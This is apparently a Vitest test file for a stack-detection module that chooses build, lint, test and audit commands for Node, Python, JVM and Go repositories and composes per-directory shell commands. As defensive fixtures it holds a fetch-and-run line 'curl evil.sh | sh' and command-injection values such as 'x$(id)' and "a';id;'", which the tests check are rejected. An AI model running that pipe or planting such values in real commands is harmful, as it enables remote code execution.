import { spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import {
  compositeCommand,
  detectedGateDefaults,
  detectedTarget,
  detectedTargetDir,
  detectStack,
  inDir,
  YARN_GATE_DEFAULTS,
} from './stackDetection.js';

describe('detectStack', () => {
  it('detects nothing for an empty repo', () => {
    expect(detectStack([])).toEqual({
      evidence: [],
      primary: null,
      stacks: [],
      suggestedDockerfile: null,
      suggestedGateCommands: {},
    });
  });

  it('detects node and suggests only the scripts package.json declares', () => {
    const r = detectStack(['package.json', 'src/index.ts'], {
      packageJsonScripts: ['lint', 'test', 'typecheck'],
    });
    expect(r.stacks).toEqual(['node']);
    expect(r.primary).toBe('node');
    expect(r.suggestedDockerfile).toBe('node');
    expect(r.suggestedGateCommands).toEqual({
      runLint: 'npm run lint',
      runTests: 'npm test',
      runTypecheck: 'npm run typecheck',
    });
    expect(r.evidence).toEqual(['package.json']);
  });

  it('suggests no node commands for scripts the package.json does not declare', () => {
    const r = detectStack(['package.json'], { packageJsonScripts: ['build'] });
    expect(r.suggestedGateCommands).toEqual({});
    // Without scripts info at all, nothing is guessed.
    expect(detectStack(['package.json']).suggestedGateCommands).toEqual({});
  });

  it.each([
    ['yarn.lock', { runLint: 'yarn lint', runTests: 'yarn test', runTypecheck: 'yarn typecheck' }],
    [
      'pnpm-lock.yaml',
      { runLint: 'pnpm lint', runTests: 'pnpm test', runTypecheck: 'pnpm typecheck' },
    ],
    [
      'package-lock.json',
      { runLint: 'npm run lint', runTests: 'npm test', runTypecheck: 'npm run typecheck' },
    ],
  ])('uses the %s package manager for node commands', (lockfile, commands) => {
    const r = detectStack(['package.json', lockfile], {
      packageJsonScripts: ['lint', 'test', 'typecheck'],
    });
    expect(r.suggestedGateCommands).toEqual(commands);
    expect(r.evidence).toEqual(['package.json', lockfile]);
  });

  it('detects python conservatively from requirements.txt', () => {
    const r = detectStack(['requirements.txt']);
    expect(r).toMatchObject({
      primary: 'python',
      stacks: ['python'],
      suggestedDockerfile: 'python',
      suggestedGateCommands: { runTests: 'python -m pytest' },
    });
  });

  it('suggests ruff for a pyproject python repo', () => {
    const r = detectStack(['pyproject.toml']);
    expect(r.suggestedGateCommands).toEqual({
      runLint: 'ruff check',
      runTests: 'python -m pytest',
    });
  });

  it('detects jvm from pom.xml', () => {
    const r = detectStack(['pom.xml']);
    expect(r.suggestedGateCommands).toEqual({
      runBuild: 'mvn -B -q -DskipTests package',
      runTests: 'mvn -B -q test',
    });
    expect(r.suggestedDockerfile).toBe('jvm');
  });

  it('detects jvm from a gradle build file', () => {
    for (const file of ['build.gradle', 'build.gradle.kts']) {
      const r = detectStack([file]);
      expect(r.stacks).toEqual(['jvm']);
      expect(r.suggestedGateCommands).toEqual({
        runBuild: './gradlew build -x test --no-daemon',
        runTests: './gradlew test --no-daemon',
      });
    }
  });

  it('detects go with no curated image', () => {
    const r = detectStack(['go.mod']);
    expect(r).toMatchObject({
      primary: 'go',
      stacks: ['go'],
      suggestedDockerfile: 'go',
      suggestedGateCommands: {
        runBuild: 'go build ./...',
        runLint: 'go vet ./...',
        runTests: 'go test ./...',
      },
    });
  });

  it('lists every stack of a polyglot repo and applies the node-first precedence', () => {
    const r = detectStack(['go.mod', 'package.json', 'pyproject.toml', 'pom.xml']);
    expect(r.stacks).toEqual(['node', 'python', 'jvm', 'go']);
    expect(r.primary).toBe('node');
    expect(r.suggestedDockerfile).toBe('node');
    expect(r.evidence).toEqual(['package.json', 'pyproject.toml', 'pom.xml', 'go.mod']);
  });

  it('picks python over jvm when node is absent', () => {
    const r = detectStack(['pom.xml', 'setup.py']);
    expect(r.stacks).toEqual(['python', 'jvm']);
    expect(r.primary).toBe('python');
  });
});

describe('detectedGateDefaults', () => {
  const detect = (files: string[]) => detectStack(files);

  it('is null where the built-in gates apply: nothing, a Node root on Yarn or unknown, no stack', () => {
    expect(detectedGateDefaults(null)).toBeNull();
    expect(detectedGateDefaults(undefined)).toBeNull();
    expect(detectedGateDefaults(detect([]))).toBeNull();
    expect(detectedGateDefaults(detect(['package.json']))).toBeNull();
    expect(detectedGateDefaults(detect(['package.json', 'yarn.lock']))).toBeNull();
    // A detection stored before the manager was recorded.
    expect(
      detectedGateDefaults({ components: [{ path: '', stacks: ['node'] }], evidence: [] })
    ).toBeNull();
    // Node outranks Python at a polyglot root, so the Node gates stay.
    expect(detectedGateDefaults(detect(['package.json', 'pyproject.toml']))).toBeNull();
    expect(
      detectedGateDefaults({ components: [{ path: '', stacks: ['node'] }], packageManager: 'bun' })
    ).toBeNull();
    // More components than a composite covers, and no root signal, is a layout with no single
    // right place, which is not the same as "nothing detected": no commands, not the built-ins.
    expect(
      detectedGateDefaults(detect(Array.from({ length: 9 }, (_, i) => `s${i}/go.mod`)))
    ).toEqual({});
  });

  it('gives each non-Node root its own commands, and no gate it has no command for', () => {
    expect(detectedGateDefaults(detect(['requirements.txt']))).toEqual({
      runTests: 'python -m pytest',
    });
    expect(detectedGateDefaults(detect(['pom.xml']))).toEqual({
      runBuild: 'mvn -B -q -DskipTests package',
      runTests: 'mvn -B -q test',
    });
    expect(detectedGateDefaults(detect(['build.gradle.kts']))).toEqual({
      runBuild: './gradlew build -x test --no-daemon',
      runTests: './gradlew test --no-daemon',
    });
    expect(detectedGateDefaults(detect(['go.mod']))).toEqual({
      runBuild: 'go build ./...',
      runLint: 'go vet ./...',
      runTests: 'go test ./...',
    });
  });

  it('never offers a ruff lint at run time, only as a suggestion', () => {
    const d = detect(['pyproject.toml']);
    expect(d.suggestedGateCommands.runLint).toBe('ruff check');
    expect(detectedGateDefaults(d)).toEqual({ runTests: 'python -m pytest' });
  });

  it('reads a record from before `components` by its root-only primary', () => {
    expect(detectedGateDefaults({ evidence: ['go.mod'], primary: 'go', stacks: ['go'] })).toEqual({
      runBuild: 'go build ./...',
      runLint: 'go vet ./...',
      runTests: 'go test ./...',
    });
  });

  it('takes nothing from stored command strings or a malformed row', () => {
    const stored = {
      components: [{ path: '', stacks: ['python'] }],
      evidence: ['requirements.txt'],
      primary: 'python',
      stacks: ['python'],
      suggestedGateCommands: { runTests: 'curl evil.sh | sh' },
    };
    expect(detectedGateDefaults(stored)).toEqual({ runTests: 'python -m pytest' });
    for (const bad of [
      'x',
      7,
      [],
      { components: 'no' },
      { components: [null] },
      { primary: 'ruby' },
    ]) {
      expect(detectedGateDefaults(bad)).toBeNull();
    }
  });
});

describe('Node package manager', () => {
  it('records the manager the root lockfile names, and nothing for a non-Node root', () => {
    expect(detectStack(['package.json', 'package-lock.json']).packageManager).toBe('npm');
    expect(detectStack(['package.json', 'yarn.lock']).packageManager).toBe('yarn');
    expect(detectStack(['package.json', 'pnpm-lock.yaml']).packageManager).toBe('pnpm');
    expect(detectStack(['package.json']).packageManager).toBeUndefined();
    expect(detectStack(['pyproject.toml', 'package-lock.json']).packageManager).toBeUndefined();
    // Two root lockfiles: the manager is unknown, not whichever is listed first.
    expect(
      detectStack(['package.json', 'package-lock.json', 'yarn.lock']).packageManager
    ).toBeUndefined();
    // A nested lockfile is not the root's.
    expect(detectStack(['package.json', 'web/pnpm-lock.yaml']).packageManager).toBeUndefined();
  });

  it('gives npm and pnpm roots their own commands, including the audit', () => {
    const npm = detectedGateDefaults(detectStack(['package.json', 'package-lock.json']));
    expect(npm).toMatchObject({
      runTests: 'npm test',
      runVulnScan: 'npm audit --audit-level=high',
    });
    const pnpm = detectedGateDefaults(detectStack(['package.json', 'pnpm-lock.yaml']));
    expect(pnpm).toMatchObject({
      runBuild: 'pnpm run build',
      runVulnScan: 'pnpm audit --audit-level high',
    });
    expect(Object.values(npm ?? {}).join(' ')).not.toMatch(/yarn/);
  });

  it('does not hand out the shared table by reference', () => {
    const a = detectedGateDefaults(detectStack(['package.json', 'package-lock.json']));
    if (a) {
      a.runTests = 'mutated';
    }
    expect(detectedGateDefaults(detectStack(['package.json', 'package-lock.json']))?.runTests).toBe(
      'npm test'
    );
  });
});

describe('Node package manager from the packageManager pin', () => {
  const pkg = (packageManager: string) => JSON.stringify({ name: 'x', packageManager });
  const withPin = (files: string[], packageManager?: string) =>
    detectStack(files, packageManager ? { packageJson: pkg(packageManager) } : undefined);

  it('names the manager from the pin, which outranks a lockfile', () => {
    expect(withPin(['package.json', 'package-lock.json'], 'pnpm@10.34.7').packageManager).toBe(
      'pnpm'
    );
    expect(withPin(['package.json', 'yarn.lock'], 'npm@11.1.0').packageManager).toBe('npm');
    // No lockfile at all: the pin is the only evidence.
    expect(withPin(['package.json'], 'pnpm@10.34.7+sha512.abc').packageManager).toBe('pnpm');
  });

  it('keeps packageManager an enum, never the raw field', () => {
    const d = withPin(['package.json'], 'pnpm@10.34.7+sha512.abcdef');
    expect(d.packageManager).toBe('pnpm');
    expect(JSON.stringify(d)).not.toContain('sha512');
    expect(detectedGateDefaults(d)).toMatchObject({ runTests: 'pnpm test' });
  });

  it('tells Yarn Classic from Berry by the pin, else by .yarnrc.yml, else leaves it unknown', () => {
    expect(withPin(['package.json', 'yarn.lock'], 'yarn@1.22.22')).toMatchObject({
      packageManager: 'yarn',
      yarnFlavor: 'classic',
    });
    expect(withPin(['package.json', 'yarn.lock'], 'yarn@4.18.1')).toMatchObject({
      packageManager: 'yarn',
      yarnFlavor: 'berry',
    });
    expect(withPin(['package.json', 'yarn.lock', '.yarnrc.yml'])).toMatchObject({
      packageManager: 'yarn',
      yarnFlavor: 'berry',
    });
    const unknown = withPin(['package.json', 'yarn.lock']);
    expect(unknown.packageManager).toBe('yarn');
    expect(unknown.yarnFlavor).toBeUndefined();
    // A pin outranks the config file: Corepack would run what the pin says.
    expect(withPin(['package.json', 'yarn.lock', '.yarnrc.yml'], 'yarn@1.22.22').yarnFlavor).toBe(
      'classic'
    );
  });

  it('ignores a pin it cannot read, and falls back to the lockfile', () => {
    for (const bad of ['bun@1.2.0', 'yarn', '', 'pnpm@', 'npm@latest', '$(id)@1']) {
      expect(withPin(['package.json', 'package-lock.json'], bad).packageManager, bad).toBe('npm');
    }
    expect(
      detectStack(['package.json', 'package-lock.json'], { packageJson: 'not json' }).packageManager
    ).toBe('npm');
  });

  it('gives Yarn Classic the built-in gates but no audit, which Yarn 1 could only send to a public host', () => {
    const classic = detectedGateDefaults(withPin(['package.json', 'yarn.lock'], 'yarn@1.22.22'));
    expect(classic).toEqual({
      runBuild: YARN_GATE_DEFAULTS.runBuild,
      runLint: YARN_GATE_DEFAULTS.runLint,
      runTests: YARN_GATE_DEFAULTS.runTests,
      runTypecheck: YARN_GATE_DEFAULTS.runTypecheck,
    });
    expect(classic).not.toHaveProperty('runVulnScan');
    // Berry's `yarn npm audit` is the built-in, and stays Berry's.
    expect(YARN_GATE_DEFAULTS.runVulnScan).toBe('yarn npm audit --severity high');
  });

  it('leaves Yarn Berry and an unknown Yarn on the built-in gates, as before', () => {
    expect(detectedGateDefaults(withPin(['package.json', 'yarn.lock'], 'yarn@4.18.1'))).toBeNull();
    expect(detectedGateDefaults(withPin(['package.json', 'yarn.lock']))).toBeNull();
    expect(detectedGateDefaults(withPin(['package.json']))).toBeNull();
  });

  it('reads scripts from the package.json text for the suggestions', () => {
    const d = detectStack(['package.json', 'package-lock.json'], {
      packageJson: JSON.stringify({ scripts: { lint: 'x', test: 'y' } }),
    });
    expect(d.suggestedGateCommands).toEqual({ runLint: 'npm run lint', runTests: 'npm test' });
  });
});

describe('components as the target', () => {
  const D = (files: string[], opts?: Parameters<typeof detectStack>[1]) => detectStack(files, opts);

  it('uses the root when it has a signal, and the one component when it has none', () => {
    expect(detectedTarget(D(['go.mod', 'svc/pom.xml']))).toMatchObject({ dir: '', stack: 'go' });
    expect(detectedTarget(D(['svc/api/pom.xml']))).toMatchObject({ dir: 'svc/api', stack: 'jvm' });
    expect(detectedTargetDir(D(['svc/api/pom.xml']))).toBe('svc/api');
    expect(detectedTargetDir(D(['go.mod']))).toBe('');
  });

  it('runs the stack defaults in the component, and only the defaults', () => {
    const d = D(['backend/pom.xml']);
    expect(detectedGateDefaults(d)).toEqual({
      runBuild: "cd 'backend' && mvn -B -q -DskipTests package",
      runTests: "cd 'backend' && mvn -B -q test",
    });
    // The JVM build tool is the component's, not the root's.
    expect(detectedGateDefaults(D(['backend/build.gradle']))?.runTests).toBe(
      "cd 'backend' && ./gradlew test --no-daemon"
    );
    expect(inDir('', 'go test ./...')).toBe('go test ./...');
  });

  it('gives a Node component its own lockfile’s manager, and Yarn commands when it has none', () => {
    expect(detectedGateDefaults(D(['web/package.json', 'web/pnpm-lock.yaml']))?.runTests).toBe(
      "cd 'web' && pnpm test"
    );
    expect(
      detectedGateDefaults(D(['web/package.json', 'web/package-lock.json']))?.runVulnScan
    ).toBe("cd 'web' && npm audit --audit-level=high");
    // No lockfile in the directory: npm's commands, which work without one (Yarn 4 would refuse).
    expect(detectedGateDefaults(D(['web/package.json']))?.runTests).toBe("cd 'web' && npm test");
    expect(detectedGateDefaults(D(['web/package.json']))?.runBuild).toBe(
      "cd 'web' && npm run build"
    );
    expect(detectedGateDefaults(D(['web/package.json', 'web/yarn.lock']))?.runVulnScan).toBe(
      "cd 'web' && yarn npm audit --severity high"
    );
    expect(
      detectedGateDefaults(D(['web/package.json', 'web/yarn.lock', 'web/.yarnrc.yml']))?.runTests
    ).toBe("cd 'web' && yarn test");
    // A lockfile at the root, where there is no package.json, is not the component's.
    expect(detectedGateDefaults(D(['web/package.json', 'pnpm-lock.yaml']))?.runTests).toBe(
      "cd 'web' && npm test"
    );
  });

  it('stays ambiguous, with no single directory, when several components compete', () => {
    const d = D(['api/pom.xml', 'web/package.json']);
    expect(detectedTarget(d)).toBe('ambiguous');
    expect(detectedTargetDir(d)).toBe('');
    // A composite has no image either: it is not one place.
    expect(detectedTarget(D(['a/go.mod', 'b/go.mod']))).toBe('ambiguous');
  });

  it('counts only directories with a stack signal toward the cap, so a big tree still resolves', () => {
    // 120 directories of docs and one service: none of the docs is a component, so the listing is
    // complete as far as stacks go. (The cap used to count every directory, which both dropped the
    // service from `components` and switched this rule off.)
    const docs = Array.from({ length: 120 }, (_, i) => `docs/d${i}/page.md`);
    const d = D(['README.md', 'backend/pom.xml', ...docs]);
    expect(d.componentsTruncated).toBeUndefined();
    expect(d.components).toEqual([{ path: 'backend', stacks: ['jvm'] }]);
    expect(detectedGateDefaults(d)?.runTests).toBe("cd 'backend' && mvn -B -q test");
    // A signal directory sorted behind them is still found.
    const late = D([...docs, 'zz/go.mod']);
    expect(late.components).toEqual([{ path: 'zz', stacks: ['go'] }]);
  });

  it('treats a Gradle settings file as the JVM root, not a subproject as the target', () => {
    const d = D(['settings.gradle.kts', 'gradlew', 'app/build.gradle.kts']);
    expect(detectedTarget(d)).toMatchObject({ dir: '', stack: 'jvm' });
    expect(detectedGateDefaults(d)?.runTests).toBe('./gradlew test --no-daemon');
    expect(detectedGateDefaults(D(['settings.gradle', 'app/pom.xml']))?.runBuild).toBe(
      './gradlew build -x test --no-daemon'
    );
  });

  it('treats a JVM project below another as that parent’s, so a nested build is one component', () => {
    const gradle = D([
      'server/settings.gradle.kts',
      'server/gradlew',
      'server/app/build.gradle.kts',
    ]);
    expect(gradle.components).toEqual([{ path: 'server', stacks: ['jvm'] }]);
    expect(detectedGateDefaults(gradle)?.runTests).toBe(
      "cd 'server' && ./gradlew test --no-daemon"
    );
    const maven = D(['svc/pom.xml', 'svc/core/pom.xml', 'svc/web/pom.xml']);
    expect(maven.components).toEqual([{ path: 'svc', stacks: ['jvm'] }]);
    expect(detectedGateDefaults(maven)?.runTests).toBe("cd 'svc' && mvn -B -q test");
    // Not a tree: sibling JVM projects, and a JVM project beside a Node one, are still several.
    expect(detectedTarget(D(['a/pom.xml', 'b/pom.xml']))).toBe('ambiguous');
    expect(detectedTarget(D(['a/pom.xml', 'b/package.json']))).toBe('ambiguous');
    // A JVM directory keeps its other stacks.
    expect(D(['svc/pom.xml', 'svc/ui/package.json']).components).toEqual([
      { path: 'svc', stacks: ['jvm'] },
      { path: 'svc/ui', stacks: ['node'] },
    ]);
  });

  it('gives a component with two lockfiles the built-in Yarn commands, not a guessed manager', () => {
    const both = D(['web/package.json', 'web/yarn.lock', 'web/package-lock.json']);
    expect(detectedGateDefaults(both)?.runTests).toBe("cd 'web' && yarn test");
    // No lockfile at all is a different case: npm.
    expect(detectedGateDefaults(D(['web/package.json']))?.runTests).toBe("cd 'web' && npm test");
  });

  it('does not guess from an incomplete listing', () => {
    const files = ['svc/pom.xml'];
    expect(detectedTarget(D(files, { treeTruncated: true }))).toBeNull();
    expect(detectedGateDefaults(D(files, { treeTruncated: true }))).toBeNull();
    const many = Array.from({ length: 60 }, (_, i) => `s${i}/go.mod`);
    expect(detectedTarget(D(many))).toBeNull();
    // With a root signal the listing's completeness does not matter.
    expect(detectedTarget(D(['go.mod', ...files], { treeTruncated: true }))).toMatchObject({
      dir: '',
    });
  });

  it('treats a stored path as untrusted', () => {
    const stored = (path: string) => ({
      components: [{ path, stacks: ['go'] }],
      evidence: [],
    });
    for (const bad of [
      '../x',
      '/abs',
      '-rf',
      'a b',
      "a';id;'",
      'a/../b',
      'a//b',
      '.',
      '..',
      'a/b/c/d/e',
      'x$(id)',
      'a\nb',
      '',
    ]) {
      if (bad === '') {
        continue; // '' is the root, handled elsewhere
      }
      expect(detectedTarget(stored(bad)), bad).toBeNull();
      expect(detectedGateDefaults(stored(bad)), bad).toBeNull();
    }
    expect(detectedTarget(stored('services/api-v2/go_svc'))).toMatchObject({
      dir: 'services/api-v2/go_svc',
    });
  });

  it('survives a malformed row', () => {
    for (const bad of [
      { components: 'x' },
      { components: [null, 7, 'a'] },
      { components: [{ path: 3, stacks: ['go'] }] },
      { components: [{ path: 'a', stacks: 'go' }] },
      { components: [{ path: 'a', stacks: ['ruby'] }] },
      { evidence: 'x', primary: 'go' },
    ]) {
      expect(() => detectedGateDefaults(bad), JSON.stringify(bad)).not.toThrow();
    }
    expect(detectedTarget({ components: [{ path: 'a', stacks: ['ruby'] }] })).toBeNull();
    // Legacy: before `components` existed, `primary` was the root's.
    expect(detectedTarget({ evidence: ['go.mod'], primary: 'go' })).toMatchObject({
      dir: '',
      stack: 'go',
    });
  });
});

describe('composite gates for several components', () => {
  const D = (files: string[], opts?: Parameters<typeof detectStack>[1]) => detectStack(files, opts);
  const goDirs = (n: number) => Array.from({ length: n }, (_, i) => `s${i}/go.mod`);

  it('builds one command per gate, running each component in a subshell cd under a marker', () => {
    const d = D(['a/go.mod', 'b/go.mod']);
    expect(detectedTarget(d)).toBe('ambiguous');
    expect(detectedGateDefaults(d)).toEqual({
      runBuild:
        "rc=0; echo '== a =='; (cd 'a' && go build ./...) || rc=$?; " +
        "echo '== b =='; (cd 'b' && go build ./...) || rc=$?; exit $rc",
      runLint:
        "rc=0; echo '== a =='; (cd 'a' && go vet ./...) || rc=$?; " +
        "echo '== b =='; (cd 'b' && go vet ./...) || rc=$?; exit $rc",
      runTests:
        "rc=0; echo '== a =='; (cd 'a' && go test ./...) || rc=$?; " +
        "echo '== b =='; (cd 'b' && go test ./...) || rc=$?; exit $rc",
    });
  });

  it('leaves a gate absent when any component has no command for it', () => {
    // Python has only runTests, so the build and lint gates are not run in just the Go half.
    expect(detectedGateDefaults(D(['api/go.mod', 'ml/pyproject.toml']))).toEqual({
      runTests:
        "rc=0; echo '== api =='; (cd 'api' && go test ./...) || rc=$?; " +
        "echo '== ml =='; (cd 'ml' && python -m pytest) || rc=$?; exit $rc",
    });
    expect(detectedGateDefaults(D(['api/go.mod', 'web/package.json']))).not.toHaveProperty(
      'runVulnScan'
    );
  });

  it('orders components by path whatever order they are stored in', () => {
    const stored = {
      components: [
        { path: 'b', stacks: ['go'] },
        { path: 'a', stacks: ['go'] },
      ],
      evidence: [],
    };
    expect(detectedGateDefaults(stored)?.runTests).toMatch(/== a ==.*== b ==/);
  });

  it('gives each Node component its own lockfile’s manager', () => {
    const d = D([
      'admin/package.json',
      'admin/package-lock.json',
      'web/package.json',
      'web/pnpm-lock.yaml',
    ]);
    expect(detectedGateDefaults(d)?.runTests).toBe(
      "rc=0; echo '== admin =='; (cd 'admin' && npm test) || rc=$?; " +
        "echo '== web =='; (cd 'web' && pnpm test) || rc=$?; exit $rc"
    );
    expect(detectedGateDefaults(d)?.runVulnScan).toBe(
      "rc=0; echo '== admin =='; (cd 'admin' && npm audit --audit-level=high) || rc=$?; " +
        "echo '== web =='; (cd 'web' && pnpm audit --audit-level high) || rc=$?; exit $rc"
    );
  });

  it('picks the JVM build tool per component', () => {
    expect(detectedGateDefaults(D(['a/pom.xml', 'b/build.gradle']))?.runTests).toBe(
      "rc=0; echo '== a =='; (cd 'a' && mvn -B -q test) || rc=$?; " +
        "echo '== b =='; (cd 'b' && ./gradlew test --no-daemon) || rc=$?; exit $rc"
    );
  });

  it('covers up to 8 components and none beyond', () => {
    expect(detectedGateDefaults(D(goDirs(8)))?.runTests?.match(/== s\d ==/g)).toHaveLength(8);
    expect(detectedGateDefaults(D(goDirs(9)))).toEqual({});
    expect(detectedTarget(D(goDirs(9)))).toBe('ambiguous');
  });

  it('returns nothing for a stored component path that does not validate', () => {
    const stored = (bad: string) => ({
      components: [
        { path: 'a', stacks: ['go'] },
        { path: bad, stacks: ['go'] },
      ],
      evidence: [],
    });
    for (const bad of ['../x', '/abs', "b';id;'", 'a b', 'x$(id)']) {
      expect(detectedTarget(stored(bad)), bad).toBe('ambiguous');
      expect(detectedGateDefaults(stored(bad)), bad).toEqual({});
    }
    // A component with no known stack cannot run anything either.
    expect(
      detectedGateDefaults({
        components: [
          { path: 'a', stacks: ['go'] },
          { path: 'b', stacks: ['ruby'] },
        ],
        evidence: [],
      })
    ).toEqual({});
  });

  it('does not guess from an incomplete listing', () => {
    expect(detectedGateDefaults(D(['a/go.mod', 'b/go.mod'], { treeTruncated: true }))).toBeNull();
    expect(detectedGateDefaults(D(goDirs(60)))).toBeNull();
  });

  it('is not used when the root has a signal', () => {
    expect(detectedGateDefaults(D(['go.mod', 'a/go.mod', 'b/go.mod']))?.runTests).toBe(
      'go test ./...'
    );
  });
});

describe('compositeCommand run in a real sh', () => {
  const run = (parts: Array<{ dir: string; command: string }>, wrap = false) => {
    const root = mkdtempSync(join(tmpdir(), 'composite-'));
    for (const dir of ['a', 'a/sub', 'b', 'c']) {
      mkdirSync(join(root, dir), { recursive: true });
    }
    const command = compositeCommand(parts);
    const result = spawnSync('sh', ['-c', wrap ? `{ ${command}\n} 2>&1` : command], {
      cwd: root,
      encoding: 'utf8',
    });
    return { root, status: result.status, stdout: result.stdout };
  };
  const ran = (root: string, dir: string) => existsSync(join(root, dir, 'ran'));
  const touch = (dir: string) => ({ command: 'touch ran', dir });

  it('exits 0 when every component passes, and prints a marker before each', () => {
    const r = run([touch('a'), touch('b')]);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('== a ==\n== b ==\n');
    expect(ran(r.root, 'a') && ran(r.root, 'b')).toBe(true);
  });

  it('fails when the first fails, and still runs the second', () => {
    const r = run([{ command: 'touch ran && exit 3', dir: 'a' }, touch('b')]);
    expect(r.status).toBe(3);
    expect(ran(r.root, 'a')).toBe(true);
    expect(ran(r.root, 'b')).toBe(true);
    expect(r.stdout).toBe('== a ==\n== b ==\n');
  });

  it('fails when only the last or a middle component fails', () => {
    expect(run([touch('a'), touch('b'), { command: 'false', dir: 'c' }]).status).toBe(1);
    const middle = run([touch('a'), { command: 'false', dir: 'b' }, touch('c')]);
    expect(middle.status).toBe(1);
    expect(ran(middle.root, 'c')).toBe(true);
  });

  it('fails a component whose directory is missing, and carries on', () => {
    const r = run([{ command: 'true', dir: 'missing' }, touch('b')]);
    // The shell's own status for a failed `cd` (1 or 2, by shell) — what matters is that it fails.
    expect(r.status).not.toBe(0);
    expect(ran(r.root, 'b')).toBe(true);
  });

  it('does not let one component’s cd move the next one’s starting point', () => {
    const r = run([
      { command: 'cd sub && touch ran', dir: 'a' },
      { command: 'pwd > where && touch ran', dir: 'b' },
    ]);
    expect(r.status).toBe(0);
    expect(existsSync(join(r.root, 'a', 'sub', 'ran'))).toBe(true);
    expect(readFileSync(join(r.root, 'b', 'where'), 'utf8').trim()).toMatch(/\/b$/);
    expect(ran(r.root, 'b')).toBe(true);
  });

  it('works inside a braced group with stderr merged, as the gate runner wraps it', () => {
    expect(run([touch('a')], true).status).toBe(0);
    // The failing part's own status survives, so an unrunnable tool (127) still reads as one.
    expect(run([{ command: 'exit 127', dir: 'a' }, touch('b')]).status).toBe(127);
    expect(
      run([
        { command: 'exit 3', dir: 'a' },
        { command: 'exit 5', dir: 'b' },
      ]).status
    ).toBe(5);
    const bad = run([{ command: 'echo oops >&2; exit 2', dir: 'a' }], true);
    expect(bad.status).toBe(2);
    expect(bad.stdout).toBe('== a ==\noops\n');
  });
});

describe('suggestions follow the run-time defaults', () => {
  const D = (files: string[], opts?: Parameters<typeof detectStack>[1]) => detectStack(files, opts);

  it('suggests a single component’s gates, in its directory', () => {
    const d = D(['backend/pom.xml']);
    expect(d.suggestedGateCommands).toEqual({
      runBuild: "cd 'backend' && mvn -B -q -DskipTests package",
      runTests: "cd 'backend' && mvn -B -q test",
    });
    expect(d.suggestedGateCommands).toEqual(detectedGateDefaults(d));
    expect(D(['svc/go.mod']).suggestedGateCommands.runLint).toBe("cd 'svc' && go vet ./...");
  });

  it('suggests the composites for 2..8 components', () => {
    const d = D(['a/go.mod', 'b/pyproject.toml']);
    expect(d.suggestedGateCommands).toEqual({
      runTests:
        "rc=0; echo '== a =='; (cd 'a' && go test ./...) || rc=$?; " +
        "echo '== b =='; (cd 'b' && python -m pytest) || rc=$?; exit $rc",
    });
    expect(d.suggestedGateCommands).toEqual(detectedGateDefaults(d));
  });

  it('suggests nothing where the defaults resolve to nothing', () => {
    const nine = Array.from({ length: 9 }, (_, i) => `s${i}/go.mod`);
    expect(D(nine).suggestedGateCommands).toEqual({});
    expect(D(['a/go.mod', 'b/go.mod'], { treeTruncated: true }).suggestedGateCommands).toEqual({});
    expect(D(['README.md']).suggestedGateCommands).toEqual({});
  });

  it('keeps the root’s suggestions exactly, whatever components sit below it', () => {
    expect(
      D(['package.json', 'a/go.mod'], { packageJsonScripts: ['lint', 'test'] })
        .suggestedGateCommands
    ).toEqual({ runLint: 'npm run lint', runTests: 'npm test' });
    expect(D(['pyproject.toml', 'a/go.mod']).suggestedGateCommands).toEqual({
      runLint: 'ruff check',
      runTests: 'python -m pytest',
    });
    expect(D(['requirements.txt']).suggestedGateCommands).toEqual({ runTests: 'python -m pytest' });
    expect(D(['go.mod']).suggestedGateCommands).toEqual({
      runBuild: 'go build ./...',
      runLint: 'go vet ./...',
      runTests: 'go test ./...',
    });
    expect(D(['package.json', 'yarn.lock']).suggestedGateCommands).toEqual({});
  });
});

describe('Yarn flavour from the yarn.lock header', () => {
  const CLASSIC = '# THIS IS AN AUTOGENERATED FILE.\n# yarn lockfile v1\n';
  const BERRY =
    '# This file is generated by running "yarn install".\n\n__metadata:\n  version: 8\n';
  const files = ['package.json', 'yarn.lock'];

  it('reads Classic from `# yarn lockfile v1` and Berry from `__metadata:`', () => {
    const classic = detectStack(files, { yarnLockHead: CLASSIC });
    expect(classic).toMatchObject({ packageManager: 'yarn', yarnFlavor: 'classic' });
    expect(classic.components).toEqual([
      { packageManager: 'yarn', path: '', stacks: ['node'], yarnFlavor: 'classic' },
    ]);
    expect(detectStack(files, { yarnLockHead: BERRY })).toMatchObject({
      packageManager: 'yarn',
      yarnFlavor: 'berry',
    });
  });

  it('leaves the flavour unknown for a header that says neither, or none at all', () => {
    expect(detectStack(files, { yarnLockHead: '# something else\n' }).yarnFlavor).toBeUndefined();
    expect(detectStack(files).yarnFlavor).toBeUndefined();
    expect(detectStack(files, { yarnLockHead: '' }).yarnFlavor).toBeUndefined();
  });

  it('is outranked by a packageManager pin and by .yarnrc.yml', () => {
    expect(
      detectStack(files, {
        packageJson: JSON.stringify({ packageManager: 'yarn@4.1.0' }),
        yarnLockHead: CLASSIC,
      }).yarnFlavor
    ).toBe('berry');
    expect(
      detectStack(files, {
        packageJson: JSON.stringify({ packageManager: 'yarn@1.22.19' }),
        yarnLockHead: BERRY,
      }).yarnFlavor
    ).toBe('classic');
    expect(detectStack([...files, '.yarnrc.yml'], { yarnLockHead: CLASSIC }).yarnFlavor).toBe(
      'berry'
    );
  });

  it('does not apply to a root that is not on yarn', () => {
    expect(
      detectStack(['package.json', 'package-lock.json'], { yarnLockHead: CLASSIC })
    ).not.toHaveProperty('yarnFlavor');
    expect(
      detectStack(['package.json', 'pnpm-lock.yaml'], { yarnLockHead: CLASSIC })
    ).not.toHaveProperty('yarnFlavor');
  });

  it('a Classic root resolves to the Classic gates, without a vulnerability scan', () => {
    expect(detectedGateDefaults(detectStack(files, { yarnLockHead: CLASSIC }))).toEqual({
      runBuild: 'yarn build',
      runLint: 'yarn lint',
      runTests: 'yarn test',
      runTypecheck: 'yarn typecheck',
    });
  });
});
